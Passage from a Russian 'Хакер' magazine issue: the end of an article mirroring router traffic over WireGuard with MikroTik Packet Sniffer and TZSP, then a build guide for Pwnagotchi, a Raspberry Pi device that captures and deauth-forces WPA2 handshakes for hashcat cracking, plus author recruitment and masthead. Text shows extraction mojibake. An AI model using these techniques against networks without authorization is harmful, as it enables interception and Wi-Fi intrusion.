    public-key=&quot;HEbUC3ae1r03OIT8gPtVL3xmIPPHNYCKFVDXBvPQeyk=&quot;





  [admin@BORDER] /interface/wireguard>



  [admin@BORDER] /ip/address> add address=10.0.0.1/24
  interface=thepossessor



  [admin@BORDER] /interface/wireguard/peers> print


  Columns: INTERFACE, PUBLIC-KEY, ENDPOINT-PORT, ALLOWED-ADDRESS,
  PERSISTENT-KEEPALIVE


  # INTERFACE  PUBLIC-KEY                                    ENDPOINT-PORT
  ALLOWED-ADDRESS  PERSISTENT-KEEPALIVE


  0 thelaw     iQo3n/mi+w6gUrQim9D0FHNpXMxEL0cscMVSE6w3dCU=              0
  10.0.0.2/32      25s



Wireguard-клиент:


[Interface]
PrivateKey = eN3iDA1gOL2cygLwNRkDasFOoUzTFjpdLCmK4YMEhUA=
Address = 10.0.0.2/24


[Peer]
PublicKey = HEbUC3ae1r03OIT8gPtVL3xmIPPHNYCKFVDXBvPQeyk=
Endpoint = 212.100.144.100:51820
AllowedIPs = 10.0.0.1/32
PersistentKeepalive = 25

Ад ресация для туннеля — 10.0.0.0/24. Целевой порт Wireguard-сервера —
UDP/51820, а PersistentKeepalive для обеих сторон равен 25 секун дам.
Если с настройками все нормально, туннель между двумя хостами будет акти-
вен и можно передавать данные.




                    Во время настройки туннеля учи тывай значение
                     MTU,  опре деляющее  мак симальный  размер
                       полез ных дан ных. При некор рек тных зна чениях
                  MTU возможна избы точная фрагментация. Также
                        учитывай размеры своей инфраструктуры,  так
                         как при зеркалировании трафика возрастает наг-
                        рузка на процес сор и интерфей сы маршрутиза-
                         тора. При  необходимос ти  настраивай  допол-
                        нительные фильтры для зеркалирования, что бы
                         сзуить круг поиска и сбавить наг рузку на обо-
                       рудование.



PACKET SNIFFER

Это спе циальный инстру мент внутри RouterOS, который может зер калировать
трафик и передавать его поверх L3-соединений с помощью TZSP. Packet
Sniﬀer так же под держивает фильтры, по которым будет выпол няться зер-
калиро вание:
 • фильтрация по интерфей сам;
 • фильтрация по протоколам;
 • фильтрация по TCP/UDP-портам источника/наз начения;
 • фильтрация по MAC-адресам источника/назначения;
 • фильтрация по IP-адре сам источника/наз начения, так же под держиваются
   IPv4 и IPv6 вместе;
 • фильтрация по VLAN;
 • фильтрация по CPU;
 • выбор нап равления трафика;
 • опе рации OR и AND.

В контексте моей сети я укажу фильтра цию толь ко по интерфей сам ether1
и ether2. Это интерфей сы, смот рящие в сто рону внутренней сети, которая
обращает ся к интерне ту. Затем с это го интерфейса будет собираться копия
и отправ ляться на при емник. Направле ние тра фика — в обе стороны (any).
  Сер вер назначения для TZSP нас траивается в раз деле Streaming. Понадо-
бится указать адрес целево го приемника и UDP-порт. Так как мы пускаем
зеркало по Wireguard-тун нелю, нужно ука зать адрес приемника, который
находится именно на его WG-интерфейсе, а это 10.0.0.2.





  [admin@BORDER] /tool/sniffer> set filter-interface=ether1,ether2 filter-
  stream=yes streaming-enabled=yes streaming-server=10.0.0.2



  [admin@BORDER] /tool/sniffer> start



Кста ти говоря, Packet Sniﬀer требует ручного запус ка, поэтому в конце коман-
да start.


ÎÁÐÀÁÎÒÊÀ TZSP

Пос ле акти вации Packet Sniﬀer зеркалирован ный тра фик уже полетит в сто-
рону приемни ка. Необ ходимо избавиться от избы точных заголовков TZSP
в зеркалирован ном тра фике. Для этого есть инстру мент tzsp2pcap, он прост
и удобен, ком пилиру ется без особых проблем:


git clone https://github.com/thefloweringash/
cd tzsp2pcap
~/tzsp2pcap$ make



  caster@thepossessor:~/research/tzsp2pcap$ ./tzsp2pcap -h


  tzsp2pcap: receive tazmen sniffer protocol over udp and
  produce pcap formatted output


  Usage ./tzsp2pcap [-h] [-v] [-f] [-p PORT] [-o FILENAME] [-s SIZE] [-G
  SECONDS] [-C SIZE] [-z CMD]
      -h           Display this message
      -v           Verbose (repeat to increase up to -vv)
      -f           Flush output after every packet
      -p PORT      Specify port to listen on  (defaults to 37008)
      -o FILENAME  Write output to FILENAME   (defaults to stdout)
      -s SIZE      Receive buffer size        (defaults to 65535)
      -G SECONDS   Rotate file every n seconds
      -C FILESIZE  Rotate file when FILESIZE is reached
      -z CMD       Post-rotate command to execute


Заметь, никаких парамет ров, которые помогли бы обрабаты вать поступа-
ющий трафик, у tzsp2pcap нет. Для примера я запущу tzsp2pcap, чтобы он
сре зал заголовки TZSP и сохранял весь зер калиру емый трафик в формате
pcap.
  С помощью %s я сделаю так, что бы у каж дого соз даваемого дампа был
таймстемп Unix. Аргумент -G указывает на то, через сколько секунд будет соз-
дан вто рой файл pcap. Я выб рал 86 400 секунд, то есть новый дамп тра фика
будет соз даваться раз в сутки. Пример чисто из головы — в реальных усло-
виях может понадобиться дру гое зна чение.



  caster@thepossessor:~/research/tzsp2pcap$ sudo ./tzsp2pcap -o
  "dump_%s.pcap" -G 86400


Работа tzsp2pcap прерывается по нажатию Ctrl-C, все дампы тра фика будут
сохранены. Вот список всех созданных дам пов, каждый новый дамп соз-
давался через 10 секунд (пос ле dump_ идет UNIXTIMESTAMP):



  caster@thepossessor:~/dumps$ ls -l
  total 12
  -rw------- 1 caster caster  880 Sep 19 13:04 dump_1695117866.pcap
  -rw------- 1 caster caster 2970 Sep 19 13:04 dump_1695117876.pcap
  -rw------- 1 caster caster  366 Sep 19 13:04 dump_1695117886.pcap





           Обработанный трафик без TZSP-заголовков

Таким образом мы получа ем полную копию трафика из внутренней сети пог-
раничного мар шрутизатора, а также избавля емся от избы точных TZSP-
заголов ков. Вот как выглядел бы клиент ский трафик без обработ ки.





           Кли ент ский трафик без сре зания TZSP-заголовков

Так мож но про водить зеркалиро вание тра фика, обра батывать заголовки
TZSP и хранить дампы локально на приемнике.


ÂÛÂÎÄÛ

Это очень творческая и экспериментальная работа. В статье я пытал ся рас-
смот реть СОРМ-2 через призму сетевых про токолов, так что это исклю-
чительно концепт. У СОРМ-2 есть множес тво реали заций, и каждая установка
в конкретной инфраструктуре — уникальный  кейс. Впрочем, реаль ную
СОРМ-2 я не использовал и, даже если бы мне предоставили доступ, вряд ли
смог бы написать об этом статью.
GEEK





  СОБИРАЕМ
  ХАКЕРСКИЙ ДЕВАЙС
  С ИСКУССТВЕННЫМ
  ИНТЕЛЛЕКТОМ




Наверняка  читатели  «Хакера»  хотя  бы
однажды задавались вопросом: мож но ли
самостоятельно    собрать    недоро гое
устройство, которое будет что-нибудь взла-
мывать по нажатию одной кнопки? Или вов-       Валентин Холмогоров                                                                               Ведущий редактор
се без кнопки, само, авто матически? Мож-          valentin@holmogorov.ru
но! Встречайте Pwnagotchi — самодельный
хакерский девайс для взлома беспровод-
ных сетей, работа ющий на основе искусс-
твенного интеллек та. Да еще и с циф ровым
питом цем внутри!


Глядя на маленькую конс трукцию с дисплеем, на котором виртуаль ный
питомец кор чит забав ные рожицы, невозможно отделаться от ощу щения, что
Pwnagotchi чем-то похож на Flipper Zero. Опре деленное родство этих про-
ектов действи тельно прослежива ется: в ин тервью «Хакеру» создатель «Флип-
пера» Павел Жовнер упоминал о том, что, при думывая свое устрой ство, он
вдох новлялся Pwnagotchi. «Тамагочи для хакеров» (название Pwnagotchi
представ ляет собой гибрид жаргонного сло вечка Pwn и названия популярной
игрушки от ком пании Bandai) дей ствительно появился на свет раньше: первая
версия этого девай са была анонсирована в октябре 2019 года, а Flipper Zero
зашел на Kiсkstarter в июле 2020-го.
  Наконец, эти устройства дей ствительно раз ные. «Флиппер» — это «швей-
царский нож» хакера или пентестера, бла года ря дополнительным модулям
и при ложе ниям он позволяет использовать широкий набор разнообразных
инструментов. С одним важ ным ограничением: в нем есть почти всё, кроме
средств для взлома Wi-Fi. Что бы получить такую воз можность, пользователь
«Флип пера»  должен  приобрести  отдельный  модуль,  в  то  вре мя
как Pwnagotchi, наоборот, создан для решения одной-единс твенной прак-
тической задачи — взлома Wi-Fi. Есть и еще одно отличие: для взаимодей-
ствия с Flipper Zero используется целых две кноп ки, тогда как Pwnagotchi
вооб ще  лишен  каких-либо  орга нов  управления.  Достаточно  включить
питание… и он просто работает. Кстати, а как имен но?


ÊÀÊ ÐÀÁÎÒÀÅÒ PWNAGOTCHI?

Когда твой телефон, ноутбук или дру гой девайс уста нав ливает беспро водное
соединение с точкой доступа по про токолу WPA2, они обме ниваются четырь-
мя спе циальными пакетами данных, позволяющи ми наладить меж ду устрой-
ствами безопасный канал свя зи. Этот процесс называ ется четырехступен-
чатым рукопо жати ем. Во вре мя рукопожатия по бес провод ной сети переда-
ются сообщения EAPOL (extensible authentication protocol over LAN). Во вто-
ром пакете (EAPOL M2) клиент сооб щает точ ке дос тупа, что ему известен
ключ PSK. В ответном сообщении (EAPOL M3) точка дос тупа передает
информацию о том, что ключ валиден. Если подтвержде ния не приходит,
устройство, вероятнее все го, попыталось выполнить подклю чение с неп-
равильным паролем.
   Pwnagotchi перехватывает и сохраня ет данные из под твержден ных пакетов
M2. Впос ледствии пользователь устрой ства может вос становить пароль бес-
про вод ной сети из хеша методом перебо ра по словарю. Для этого сущес тву-
ют спе циальные программы, например hashcat, или онлай новые сервисы
вро де Onlinehashcrack.
  Для сбора хешей Pwnagotchi использует утилиту Bettercap, хорошо зна-
комую всем, кто имел дело с  Kali  Linux. Это специальный инструмент
для перехвата трафика в беспроводных сетях и проведе ния MITM-атак.
Pwnagotchi сканирует эфир и в момент подклю чения клиент ских устройств
к точке дос тупа захватывает хен дшейк, а затем записы вает полученные дан-
ные на SD-карту в виде фай лов PCAP для пос ледующе го анализа. «Рукопо-
жатия» происхо дят регулярно, например когда в зоне действия сети появ-
ляются владельцы под клю чавшихся рань ше к этой точке доступа мобильных
телефонов или при включении беспро вод ных прин теров. Пос коль ку такая
ата ка полностью пассивна, выявить ее очень сложно — Pwnagotchi дей ствует
бесшумно и незаметно.
  Однако устройство может «форсировать» сбор хендшей ков, задей ство вав
более агрессив ные методы, чем простое сканирование эфира. Первый —
деаутентификация: Pwnagotchi отправляет от име ни кли ента и точки доступа
всем под клю ченным к сети устрой ствам спе циальные пакеты, раз рывающие
соединение. Потеряв шие связь кли енты возобновляют прерванное подклю-
чение, а Pwnagotchi перехватывает передаваемые ими хеши паролей.
   Вто рой метод — это отправка точке доступа специаль ных пакетов EAPOL
с целью спровоци ровать утечку PMKID. В этом случае перехват хендшей ка
и вовсе не требуется: PMKID передается в пер вом пакете четырехступен-
чатого рукопожатия (М1) еще до этапа аутентификации с использованием
пароля. Эта фун кция исполь зуется роутерами в некоторых корпоративных
сетях для переключения меж ду точками доступа с идентичны ми именами,
но далеко не все устройства под вержены такой уяз вимости.
  В своей работе Pwnagotchi использует искусственный интеллект, а если
говорить точнее, AI-модель под названи ем Actor Advantage  Critic (A2C).
В рамках модели A2C алго ритм оценивает текущее состояние устройства
и выдает рекомендации для его дальнейше го поведения с целью получить
наилучший результат, то есть создает логические цепочки «состояние — дей-
ствие — вознаграждение». Таким образом, Pwnagotchi «учит ся» взла мывать
беспроводные  сети, что называется, «на  ходу»: чем больше успешных
попыток перех вата хешей совершит девайс, тем быстрее он станет действо-
вать в будущем, выбирая в каж дом кон кретном случае наиболее выгодную
тактику.
   Что ж, как работа ет Pwnagotchi, мы в общих чер тах разобрались, теперь
давай посмотрим, как эта игрушка устроена.


ÓÑÒÐÎÉÑÒÂÎ PWNAGOTCHI

Конструкция  Pwnagotchi  очень  прос та:  все компоненты можно  купить
на AliExpress, при чем сто ят они относительно недорого.





                 Конструктивные элементы Pwnagotchi

В основе устройства лежит одноплат ный компьютер Raspberry Pi Zero WН —
при чем выбирать сле дует именно модификацию WН, поскольку такое устрой-
ство оборудо вано беспро водным модулем Wi-Fi и Bluetooth и на нем уже рас-
паян интерфей сный разъем, к которо му подключается дис плей. Я покупал
свой одноплатник у про давца по имени adrol, но магазинов, торгующих
подоб ными девай сами, на «Али» мно жество.




                      Если ты читаешь эту статью в далеком и прек-
                      расном будущем, ссылки на конкретные стра-
                     ницы с товара ми на сайте AliExpress могут уже
                      не работать. Не отча ивайся: нуж ные зап части
                       без труда находятся поиском.





                          Raspberry Pi Zero WН

В качестве дисплея лучше всего подойдет модуль для RPi0 на электронных
чернилах. Если верить офи циальной стра нице проекта, Pwnagotchi под-
держивает «из коробки» экраны Waveshare V2, но сегодня эта модель (как
и V3) уже считает ся уста ревшей, и ее про изводство прекращено, поэтому
най ти в про даже такой экран не так-то просто. Я купил дисплей Waveshare
диагональю 2,13″. Эта модель имеет вер сию V4, поэтому с ее настройкой
у меня возникли некоторые проблемы — впрочем, их удалось успешно пре-
одолеть.





                      Дисплейный модуль

Что бы Pwnagotchi работал автономно, можно использовать любой ком пак-
тный повербанк со шнуром Micro-USB, но лучше купить специальный акку-
муляторный модуль питания для Raspberry Pi Zero, например той же компании
Waveshare. Он подключает ся к одноплатному компь ютеру снизу с помощью
контактов-пинов, благодаря чему собранное изделие выглядит опрятно,
без торчащих сбо ку проводов. Питание пода ется на одноплатник с помощью
переключателя, а аккумулятор заряжается через разъем Micro-USB, смон-
тированный на модуле питания.





  Мо дуль питания. Транспортная компания уронила на него бегемота,
  поэтому разъемы слегка погнуты

Наконец, тебе понадобится  карта памяти фор мата MicroSD емкостью
не менее 32 Гбайт. В принципе, подой дет любая сто имостью около доллара.


ÑÁÎÐÊÀ È ÍÀÑÒÐÎÉÊÀ

Думаю, сборку Pwnagotchi оси лит даже среднеста тистический посетитель
старшей груп пы дет ского сада. Подклю чаем акку муляторную батарею к соот-
ветствующе му разъему на плате модуля питания, уста навливаем в отверстия
по краям платы резьбовые стой ки и прикручиваем сверху Raspberry Pi Zero
WН — весь крепеж входит в ком плект пос тавки. Важно сле дить, чтобы пины
платы с аккумулятором точно совпали с контактами на нижней сто роне
одноплатника.  Теперь  плотно  вставляем  дис плей ный  модуль  сверху
в интерфей сный разъем Raspberry Pi. Все, сборка завершена, можно пить пи-
во смузи. Кое-кто распечаты вает на 3D-прин тере изящные корпуса для сво-
его устройства (готовые STL-модели можно найти в интернете), но мы обой-
дем ся без подобных излишеств.





           Собранное устройство выг лядит при мер но так

Ес ли теперь мы подадим питание на одноплатный компьютер, ничего не про-
изойдет: Raspberry Pi Zero работает только тогда, когда в соответс тву ющий
разъем встав лена карта памяти с операционной системой. Соответственно,
эту систему нужно на карту записать.
  В качестве ОС Pwnagotchi использует модифицированный дистрибутив
Raspbian с целым набором дополнительных модулей, включая Bettercap
и питонов ские биб лиотеки, которые обеспечива ют работу алгоритмов само-
обучения. Инструкция на офи циальном сайте проекта предлагает скачать
про шив ку с GitHub, но, если ты, как и я, купил дисплей Waveshare V4, офи-
циальная про шивка откажет ся работать, пос коль ку поддер жка этого типа
экранов в ней нап рочь отсутс твует. Помучавшись с этой проблемой пример-
но пол дня, я нашел модифицированную прошивку, которая нормально под-
держивает Waveshare V4, — ее я и уста новил на свой Pwnagotchi.
  Файл про шив ки удобнее всего записать на SD-карту при помощи прог-
раммы balenaEtcher или утилитой dd, если умеешь ей правильно пользовать-
ся. В результате на карте появится два раздела: boot, содержащий загрузоч-
ные файлы и фай лы с настрой ками, и раз дел с опе рационной системой.
   Те перь необходимо изменить базовые нас тройки устройства. Не извлекая
карту памяти из компьютера, открой в проводнике раздел boot и создай
в нем тексто вый файл config.toml примерно следующе го содержания:


config.toml
main.name = "PwnagotchiName"
main.lang = "en"
main.whitelist = [
  "MyWi-Fi_1" ,
  "MyWi-Fi_2"
]


main.plugins.grid.enabled = true
main.plugins.grid.report = true
main.plugins.grid.exclude = [
    "MyWi-Fi_1" ,
    "MyWi-Fi_2"
]


ui.display.enabled = true
ui.display.type = "waveshare_3"
ui.display.color = "black"

Вместо PwnagotchiName укажи про изволь ное имя своего устройства, а в раз-
делах main.whitelist и main.plugins.grid.exclude перечис ли SSID бес-
про вод ных сетей или MAC-адреса устройств, которые Pwnagotchi должен
исклю чить из сканирования и хендшейки которых не будут перехватываться.
Эти значения вво дятся в кавычках и через запятую. В списке может присутс-
тво вать, например, твоя домаш няя бес про вод ная сеть.
   Те перь  вставь SD-кар ту  в  разъ ем  Raspberry  Pi  Zero, но включать
Pwnagotchi пока еще рано. Одноплатник имеет два пор та Micro-USB: один —
исклю чительно для питания, вто рой — для питания и передачи данных. Вот
через него-то и нужно под клю чить Pwnagotchi к компьютеру с использовани-
ем кабеля. Скорее всего, девайс определится как устройство с пос ледова-
тель ным интерфейсом USB (Com3) — это значит, что Windows не сумела пра-
вильно подобрать драйверы. Скачай драйвер Ethernet RNDIS и установи его
с использовани ем диспетчера устройств.





                 USB Ethernet/RNDIS Gadget

Ес ли ты все сде лал правиль но, в системе появится новый сетевой адаптер
USB Ethernet/RNDIS Gadget. Открой в Windows свой ства подклю чения этого
адаптера и укажи вруч ную IP-адрес 10.0.0.1, маску подсети 255.255.255.0,
шлюз 10.0.0.1 и адрес сервера DNS 8.8.8.8. Сохрани вне сенные настрой-
ки — теперь при необходимости ты смо жешь подключаться к Pwnagotchi
по протоко лу SSH при помощи любого подходящего при ложе ния, например
PuTTY.


ÓÐÀ, ÐÀÁÎÒÀÅÒ!

На этом настрой ка Pwnagotchi закончена, можно включить питание устрой-
ства и нас лаждать ся полетом развле кать ся. Заг рузка девайса занимает 15–
20 секунд, после чего на экра не появится имя тво его виртуаль ного питомца
и его забав ная рожица.





                         Pwnagotchi в действии

Рожицы, к слову, Pwnagotchi умеет строить раз ные — их внешний вид и зна-
чения представлены на сай те про екта. Помимо мордашек, устрой ство отоб-
ражает текущий статус (он показывает, чем Pwnagotchi занят в настоящий
момент), количес тво перехвачен ных пакетов, SSID сети, в которой был перех-
вачен   последний   пакет,  и   дру гую   сопутству ющую  информацию.
Еще Pwnagotchi выведет на дисплей соот ветству ющее сообщение, если поб-
лизос ти обнаружится другой владелец Pwnagotchi.





                    Pwnagotchi умеет стро ить рожицы

В терминологии соз дателей это го забавного девай са Pwnagotchi «питается»
пакета ми беспро водных сетей. Если вир туальный питомец сооб щает хозяину,
что он голоден, его нужно незамед лительно покормить — то есть отнести
туда, где есть множество доступных для ска ниро вания и взлома бес провод-
ных сетей. То же самое касается настро ения питом ца: если ему скучно,
единственный спо соб развлечь Pwnagotchi — скор мить ему несколь ко
EAPOL-пакетов.
   Pwnagotchi по умол чанию работа ет в авто матическом режиме и не тре бует
вмешательства поль зователя. Вмес те с тем имеется возможность кастомиза-
ции его про шив ки: при желании можно изменить язык сообщений, добавить
новые рожицы и статусы, подклю чить дополнительные плагины, расширя-
ющие возможнос ти устройства, — все инс трукции имеются на сай те раз-
работ чиков.
  Конечно, эффектив ность использования Pwnagotchi напрямую зависит
от того, насколь ко сложный пароль был установлен в сети, рукопожатия
которой удалось перехватить. Если этот пароль соответству ет обыч ным пра-
вилам безопасности, для его восстанов ления тебе, скорее всего, придется
купить подержанную майнин говую ферму. А вот если в сети исполь зовался
прос той словарный пароль, тебе повез ло: его под бор методом брутфорса
займет несколь ко часов.


ÊÀÊ ÇÀÙÈÒÈÒÜÑß

Думаю, наши читатели прекрасно зна ют, чем чревато несанкциони рованное
под клю чение зло умышленников к бес провод ной сети: они получат доступ
к общим ресурсам и конфиденциальным файлам, смогут перехватывать тра-
фик  и  обретут  воз можность  использовать  чужой   интернет-канал.
Как защититься от атак с использованием это го устрой ства, осо бенно с уче-
том того, что Pwnagotchi действует незаметно? Обезопасить себя от пас-
сивного перех вата пакетов непросто, зато можно принять меры на случай,
если злоумышленник все-таки вос становит из хеша ключ бес проводной сети.
  Используй надежный пароль для Wi-Fi и следи за под ключенными к точке
доступа кли ента ми. Если в сети появилось новое подоз рительное устройство,
это повод изме нить пароль. Ну а лучшая защита — нас троить роутер таким
образом, что бы к нему могли подклю чать ся только устройства с заранее раз-
решен ными MAC-адресами из белого списка.
  Кому как, а мне Pwnagotchi показался забавным и интересным девайсом,
с помощью которого мож но тестировать безопасность бес проводных сетей,
прос то прогуливаясь рядом с офисом. Безусловно, Pwnagotchi не сравнится
с Flipper Zero по набору доступных функций, но на сумму, которую просят
за Flipper, можно завести целый зоопарк Pwnagotchi. И еще останется нем-
ного денег на пряники.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №10 (295)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоко лам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информа цион ных технологий и массовых коммуника ций (Роскомнадзоре), сви детельство Эл № ФС77-67001 от 30.
08.2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставля ются как информация
к размышлению. Лица, использующие дан ную информа цию в противо законных целях, могут быть прив лечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По воп росам лицензирования и получения прав на использование
редакцион ных материалов жур нала обра щайтесь по адресу: xakep@glc.ru. © Жур нал «Хакер», РФ, 2022